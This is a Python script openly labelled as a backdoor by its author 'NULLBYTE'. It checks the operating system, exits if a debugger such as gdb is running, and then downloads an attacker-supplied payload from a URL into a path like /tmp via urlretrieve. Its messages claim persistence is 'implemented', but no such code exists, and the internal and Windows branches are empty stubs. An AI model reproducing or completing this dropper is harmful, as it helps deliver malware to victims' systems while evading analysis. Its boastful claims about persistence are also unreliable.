#!/usr/bin/python3
# BACKDOOR MADE BY NULLBYTE
# Github: https://github.com/NullByte-7w7

import os
from colorama import Fore
import sys
from urllib.request import urlretrieve
import psutil

def check_system():

    if os.path.exists("/tmp"):
        return "linux"
    elif os.path.exists("C:\\"):
        return "windows"
    else:
         print("[!] UNKNOW SYSTEM!? ALIEN???")
         sys.exit(1)



def check_debugger_linux():

     for proc in psutil.process_iter(['pid','name']):     
            debuggers = {'gidra','gdb'}
            for debug in debuggers:    
                if debug in proc.info['name'].lower():
                    print("[!] FOUND PROCESS DEBUGGER")
                    sys.exit(1)



def internal_backdoor_linux():

    print(Fore.RED + "[!] BACKDOOR IS INTERNAL")
 


def external_backdoor_linux():

    print(Fore.BLUE + "[!] BACKDOOR IS EXTERNAL")
    choice_payload_attacker = input("[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ")
    if "surface" in choice_payload_attacker:
        url_payload = input("[@] URL YOUR PAYLOAD => ")
        url_payload_dest = input("[#] PUT DESTINATION PATH FOR PAYLOAD (example /tmp/) => ")
        url_payload_name = input("[$] NAME YOUR PAYLOAD (example backdoor.sh)  => ")
        url = url_payload
        dst = url_payload_dest + url_payload_name
        urlretrieve(url, dst)
        if os.path.exists(dst):
            print(Fore.MAGENTA + f"[7w7] Payload Found In -> {dst}")
            print(Fore.GREEN + "[1337] IMPLEMENTED PERSISTENCE IN PAYLOAD")
        else:
            print(Fore.RED + "[!] Payload Not Found => ")
            sys.exit(1)
    elif "local" in choice_payload_attacker:
        path_payload = input("[#] PATH YOUR PAYLOAD => ")
        access_payload = os.path.exists(path_payload)
        if access_payload:
            print(Fore.GREEN + "[1337] IMPLEMENTED PERSITENCE IN  PAYLOAD")
        else:
            print(Fore.RED + f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
    else:
        print(Fore.RED + "[!] ?????? TRY AGAIN -> surface or local")






print(Fore.RED + r'''

       
           \`*-.                    
            )  _`-.                 
           .  : `. .                
           : _   '  \               
           ; *` _.   `*-._          
           `-.-'          `-.       
             ;       `       `.     
             :.       .        \    
             . \  .   :   .-'   .   
             '  `+.;  ;  '      :   
             :  '  |    ;       ;-. 
             ; '   : :`-:     _.`* ;
            .*' /  .*' ; .*`- +'  `*' 
            `*-*   `*-*  `*-*'

    H1D3 C4T ||NULLBYTE||
''')

print(Fore.GREEN + "-----------------------------------------------")
print(Fore.WHITE + "[!] Checking Operating System...")
check_system()
print(Fore.GREEN + "[!] Checking Anti-Malware/Debuggers Running...")
check_debugger_linux()
print(Fore.GREEN + "-----------------------------------------------")

if "linux" in check_system():
    print("[!] SYSTEM LINUX")
    choice_linux = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
    if "internal" in choice_linux:
        internal_backdoor_linux()
    elif "external" in choice_linux:
        external_backdoor_linux()
    else:
        print("[!] Write internal or external try again! 7w7")
        sys.exit(1)
elif "windows" in check_system():
    print("[!] SYSTEM WINDOWS!")
    choice_windows = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
else:
    print("[!] MACHINE UNKNOW")
    sys.exit(1)
